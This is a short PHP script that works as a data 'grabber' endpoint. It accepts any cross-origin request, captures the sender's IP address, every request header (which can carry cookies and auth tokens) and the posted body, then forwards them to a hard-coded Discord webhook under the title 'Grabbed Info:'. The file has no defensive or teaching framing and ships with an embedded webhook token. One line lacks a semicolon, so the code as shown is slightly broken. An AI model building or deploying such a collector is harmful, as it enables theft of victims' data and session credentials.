<?php

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

if ($_SERVER['REQUEST_METHOD'] === "OPTIONS") {
    http_response_code(200);
    exit;
}

$webhook = "https://discord.com/api/webhooks/1470034654638637212/l48JtTXTL9u2JHqMQeiVQE-r7CfeufajUFRS-x2WNQUpaIciA_fwR7HhWEURyl7ZjbtD";

$body = file_get_contents("php://input");

$headers = function_exists('getallheaders') ? getallheaders() : $_SERVER;

$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];

$bannerImage = "https://file.garden/aIRxY75TdDxAqDHm/876566b9f57f90f5bad8aa9555abd743.png"

$payload = [
    "embeds" => [
        [
            "title" => "Grabbed Info:",
            "description" =>
                "**IP:** `$ip`\n\n" .
                "**Headers:**\n```json\n" .
                json_encode($headers, JSON_PRETTY_PRINT) .
                "\n```\n" .
                "**Payload:**\n```json\n" .
                $body .
                "\n```",
            "color" => hexdec("000000"), 
            "image" => [
                "url" => $bannerImage 
            ],
            "footer" => [
                "text" => "Developed by @scrxwy"
            ],
            "timestamp" => date("c")
        ]
    ]
];

$ch = curl_init($webhook);
curl_setopt_array($ch, [
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode($payload),
    CURLOPT_HTTPHEADER => ["Content-Type: application/json"],
    CURLOPT_RETURNTRANSFER => true
]);
curl_exec($ch);
curl_close($ch);

echo json_encode(["status" => "ok", "ip" => $ip]);
